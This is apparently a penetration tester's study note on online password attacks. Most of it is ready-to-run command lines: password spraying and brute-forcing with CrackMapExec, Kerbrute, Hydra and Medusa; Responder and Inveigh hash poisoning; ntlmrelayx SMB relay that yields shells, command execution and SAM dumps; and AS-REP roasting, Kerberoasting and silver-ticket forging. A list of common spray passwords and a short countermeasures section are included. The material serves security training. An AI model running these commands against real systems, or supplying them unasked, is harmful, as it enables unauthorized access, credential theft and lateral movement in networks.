# Online Password Attacks

## Table of Contents
- [[#Introduction|Introduction]]
- [[#Password Spraying|Password Spraying]]
- [[#Bruteforcing|Bruteforcing]]
- [[#Credential Stuffing|Credential Stuffing]]
- [[#LLMNR/NBT-NS Poisoning|LLMNR/NBT-NS Poisoning]]
- [[#SMB Relay Attacks|SMB Relay Attacks]]
- [[#Kerberos Attacks|Kerberos Attacks]]
- [[#Countermeasures|Countermeasures]]
- [[#Related Notes|Related Notes]]

---

## Introduction

Online password attacks involve attempting authentication against a live service. Unlike [[04 - Password Attacks/4.2 Offline Attacks/Offline Password Attacks|offline attacks]], online attacks interact with the target service directly and may cause account lockouts.

**Key distinction:**
- **Offline attacks**: You have the hash — crack it on your own machine
- **Online attacks**: You interact with the service — slower, riskier, but no hash needed

---

## Password Spraying

**Password spraying** is the technique of trying a *single common password* against *many usernames*, avoiding lockouts.

### Why Spray?

Most account lockout policies trigger after 5-10 failed attempts on a single account. By using 1-3 passwords against many accounts, you stay under the threshold.

### Tools for Password Spraying

#### CrackMapExec (SMB Spray)

```bash
# Single password, many users
crackmapexec smb 10.10.14.3 -u users.txt -p 'Welcome1' --continue-on-success

# Multiple passwords spray
for password in $(cat passwords.txt); do
    crackmapexec smb 10.10.14.3 -u users.txt -p "$password" --continue-on-success
done

# Local authentication spray
crackmapexec smb 10.10.14.3 -u users.txt -p 'Password123' --local-auth
```

#### Kerbrute (Kerberos Spray)

```bash
# Password spray using Kerberos (no SMB connection needed)
kerbrute passwordspray -d domain.local --dc 10.10.14.3 users.txt 'Welcome1'

# Username enumeration then spray
kerbrute userenum -d domain.local --dc 10.10.14.3 usernames.txt
kerbrute passwordspray -d domain.local --dc 10.10.14.3 valid_users.txt 'Fall2024!'
```

#### DomainPasswordSpray (PowerShell)

```powershell
# Import and run
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Welcome1' -OutFile spray_results.csv
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Fall2024!' -Domain domain.local
```

#### MSF Scanning

```
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.14.3
set USER_FILE users.txt
set PASS_FILE pass.txt
set STOP_ON_SUCCESS true
run
```

### Common Spray Passwords

```text
Welcome1
Password1
Password123
P@ssw0rd
Fall2020
Spring2021
Summer2022
Winter2023
CompanyName1
SeasonYear (e.g., Summer2024)
```

---

## Bruteforcing

Bruteforce tries *many passwords* against a *single user* — higher risk of lockout.

### SSH Bruteforce

```bash
# Hydra SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.3 -t 4 -V

# Hydra with user list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.3 -t 4

# Medusa SSH
medusa -h 10.10.14.3 -U users.txt -P rockyou.txt -M ssh -t 5

# Ncrack SSH
ncrack -U users.txt -P rockyou.txt ssh://10.10.14.3
```

### FTP Bruteforce

```bash
hydra -L users.txt -P rockyou.txt ftp://10.10.14.3 -t 16 -V
medusa -h 10.10.14.3 -U users.txt -P rockyou.txt -M ftp
```

### RDP Bruteforce

```bash
# Hydra (slow, use -t 1)
hydra -l administrator -P passwords.txt rdp://10.10.14.3 -t 1 -V

# Crowbar (better for RDP)
crowbar -b rdp -s 10.10.14.3/32 -u administrator -C passwords.txt -n 1

# Ncrack
ncrack -u administrator -P passwords.txt rdp://10.10.14.3
```

> [!warning]
> RDP is prone to lockouts. Consider spraying first before full bruteforce.

### Web Form Bruteforce

```bash
# Hydra HTTP POST form
hydra -l admin -P rockyou.txt 10.10.14.3 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Login failed" -t 64 -V

# With CSRF token extraction (via Hydra patched version or custom script)
```

### SMTP Bruteforce

```bash
hydra -l admin@domain.com -P passwords.txt smtp://10.10.14.3 -V
medusa -h 10.10.14.3 -U users.txt -P passwords.txt -M smtp
```

### MySQL Bruteforce

```bash
hydra -l root -P passwords.txt mysql://10.10.14.3
medusa -h 10.10.14.3 -u root -P passwords.txt -M mysql
```

### MSSQL Bruteforce

```bash
crackmapexec mssql 10.10.14.3 -u sa -P passwords.txt
hydra -l sa -P rockyou.txt mssql://10.10.14.3
```

### PostgreSQL Bruteforce

```bash
hydra -l postgres -P passwords.txt postgres://10.10.14.3
```

### LDAP Bruteforce

```bash
hydra -L users.txt -P passwords.txt ldap://10.10.14.3
nmap --script ldap-brute -p 389 10.10.14.3
```

### SNMP Community Strings

```bash
hydra -P community_strings.txt snmp://10.10.14.3
onesixtyone -c community.txt -i hosts.txt
```

---

## Credential Stuffing

Using previously compromised credentials against different services.

```bash
# Using CME with combo list (user:pass format)
crackmapexec smb 10.10.14.3 -H combo.txt --no-bruteforce

# Or with colon-separated credentials
crackmapexec smb 10.10.14.3 -u users.txt -H hashes.txt
```

---

## LLMNR/NBT-NS Poisoning

Intercepting network authentication requests to capture hashes.

### Responder

```bash
# Start Responder in analysis mode
sudo responder -I eth0

# Start Responder with SMB/HTTP/MSSQL/etc
sudo responder -I eth0 -wd -F -b
```

| Flag | Description |
|------|-------------|
| `-I` | Interface |
| `-wd` | Enable WPAD rogue proxy |
| `-F` | Fingerprint hosts |
| `-b` | BadTaste (NBT-NS forcer) |
| `-v` | Verbose |

### Captured Hashes

Responder captures NTLMv2 hashes in `/usr/share/responder/logs/`:
```
/usr/share/responder/logs/SMB-NTLMv2-SP-<IP>.txt
```

### Inveigh (PowerShell)

```powershell
# Load and run Inveigh
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -FileOutput Y

# Relaying (requires SMB signing to be disabled)
Invoke-Inveigh -NBNS Y -LLMNR Y -HTTP Y -FileOutput Y -ConsoleOutput Y
```

### Relaying with Responder + Impacket

```bash
# Turn off SMB in Responder config
# /etc/responder/Responder.conf — set SMB = Off, HTTP = Off

# Run ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Or get a shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

---

## SMB Relay Attacks

When SMB signing is disabled, relay captured NTLM hashes to target machines.

### Requirements

1. SMB signing **disabled** on target
2. Captured hash (via Responder, MitM, etc.)
3. Network access to target

### Identify SMB Signing Status

```bash
# Using CrackMapExec
crackmapexec smb 10.10.14.0/24 --gen-relay-list targets.txt

# Using Nmap
nmap --script smb2-security-mode -p 445 10.10.14.0/24
```

### ntlmrelayx Relay Attack

```bash
# Step 1: Stop Responder SMB/HTTP servers
# Edit /etc/responder/Responder.conf:
#   SMB = Off
#   HTTP = Off

# Step 2: Start ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Alternative: Get interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Alternative: Execute command
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami /all'
```

### Dumping SAM via Relay

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Then use CME
crackmapexec smb 127.0.0.1 -u a -p a --sam
```

---

## Kerberos Attacks

See [[04 - Password Attacks/4.4 Kerberos Attacks/Kerberos Attacks]] for full details.

### AS-REP Roasting

Users without Kerberos pre-authentication can have their TGT encrypted part extracted and cracked offline.

```bash
# Using Impacket
impacket-GetNPUsers -dc-ip 10.10.14.3 -request domain.local/users

# Using Rubeus (on Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### Kerberoasting

Request TGS tickets for service accounts and crack offline.

```bash
# Using Impacket
impacket-GetUserSPNs -dc-ip 10.10.14.3 domain.local/user:password -request

# Using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### Silver Ticket

Forge a TGS for a specific service.

```bash
impacket-ticketer -nthash <NTLM_hash> -domain-sid <SID> -domain domain.local -spn cifs/target.domain.local Administrator
```

---

## Countermeasures

### For Password Attacks
- **Account lockout policy** — 5-10 failed attempts threshold
- **Complex passwords** — 14+ characters, complexity requirements
- **MFA** — Multi-factor authentication
- **Rate limiting** — Delay between login attempts
- **Logging & monitoring** — Failed login alerts, impossible travel detection
- **Password diversity** — Disable password reuse

### For LLMNR/NBT-NS
- **Disable LLMNR** via Group Policy
- **Disable NBT-NS** on network adapters
- **Enable SMB signing** on all systems
- **Network segmentation** — Limit broadcast domains

---

## Related Notes

- [[04 - Password Attacks/Bruteforce Tools Reference]]
- [[04 - Password Attacks/4.2 Offline Attacks/Offline Password Attacks]]
- [[04 - Password Attacks/4.3 Hash Cracking/Hash Cracking Reference]]
- [[04 - Password Attacks/4.4 Kerberos Attacks/Kerberos Attacks]]
- [[02 - Active Directory/AD Attack Paths]]
